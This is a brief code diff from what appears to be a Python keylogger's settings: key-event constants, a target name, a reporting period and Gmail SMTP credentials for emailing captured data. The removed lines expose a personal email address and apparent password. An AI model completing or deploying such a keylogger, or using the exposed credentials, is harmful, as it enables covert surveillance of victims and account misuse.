@@ -6,8 +6,8 @@ import threading
 
 KEYDOWN = 'key down'
 KEYUP = 'key up'
-TO_EMAIL = 'namhoang4681@gmail.com'
-PS_EMAIL = 't16121992'
+TO_EMAIL = 'youremail@gmail.com'
+PS_EMAIL = 'yourpassword'
 PERIOD = 1800.0 #seconds
 TARGET_NAME = 'target 1'
 SVR_MAIL = 'smtp.gmail.com:587'
